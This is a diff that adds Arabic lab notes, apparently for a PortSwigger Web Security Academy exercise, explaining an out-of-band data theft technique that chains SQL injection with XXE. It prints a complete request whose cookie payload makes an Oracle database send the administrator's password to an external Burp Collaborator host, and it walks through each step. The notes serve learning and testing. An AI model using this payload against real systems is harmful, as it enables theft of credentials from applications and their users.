@@ -1411,6 +1411,85 @@ Cookie: TrackingId=uSdq0uCSJ0Bo21MN'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+
  l9fegk90yhnd387imm9m
 ```
 
+
+
+
+
+
+- <details>
+
+
+	
+	
+	
+	
+	# 📌 شرح استغلال SQLi + XXE OOB (Out-of-Band)
+	
+	## 🔎 الطلب المرسل:
+	```http
+	GET / HTTP/2
+	Host: 0a5d00a904001c92814e203400120057.web-security-academy.net
+	Cookie: TrackingId=uSdq0uCSJ0Bo21MN'+UNION+SELECT+EXTRACTVALUE(
+	  xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
+	  <!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com/">+%25remote%3b]>'),
+	'/l') FROM dual--; session=zahAEPB6Ls0SjsSsM8q2e3HMjPIF7gfi
+	```
+	
+	---
+	
+	## 📌 الخطوات اللي بتحصل:
+	
+	### 1. SQL Injection  
+	- الاستغلال بدأ من متغير `TrackingId` في الكوكيز.  
+	- تمت إضافة:  
+	  ```sql
+	  '+UNION+SELECT+EXTRACTVALUE(xmltype(...),'/l') FROM dual--
+	  ```
+	- الهدف: تنفيذ **XXE عبر قاعدة البيانات**.
+	
+	---
+	
+	### 2. EXTRACTVALUE + XMLType  
+	- `EXTRACTVALUE` تفسر النص كـ XML.  
+	- `xmltype('<...>')` يحتوي على **DTD**.  
+	- داخل الـ DTD تم تعريف **External Entity (%remote)**.
+	
+	---
+	
+	### 3. الـ Out-of-Band Exploit (OOB)  
+	```xml
+	<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com/">
+	```
+	- يعمل **DNS/HTTP request خارجي**.  
+	- اسم الدومين يصبح:  
+	  ```
+	  [باسوورد الأدمن].2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com
+	  ```
+	- مثال: لو الباسوورد `abc123` → الطلب سيكون:  
+	  ```
+	  http://abc123.2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com
+	  ```
+	
+	---
+	
+	### 4. استقبال البيانات عبر Burp Collaborator / OAST  
+	- عند تنفيذ الطلب الخارجي، السيرفر يقوم بـ **DNS lookup** أو **HTTP request**.  
+	- الباسوورد يتسجل عندك على الـ **Burp Collaborator client**.  
+	- هكذا تسحب بيانات الأدمن **خارج القناة (Out-of-Band)**.
+	
+	---
+	
+	## 🎯 الهدف النهائي
+	- استغلال **SQLi** → حقن دوال XML → تنفيذ **XXE External Entity** → تسريب بيانات حساسة (باسوورد الأدمن) إلى خادمك الخارجي.  
+	- التقنية = **SQLi + XXE OOB** → مفيدة جدًا عند غياب النتائج المباشرة في الـ response.
+	
+	
+
+
+  </details>
+
+
+
  
 </details>
 
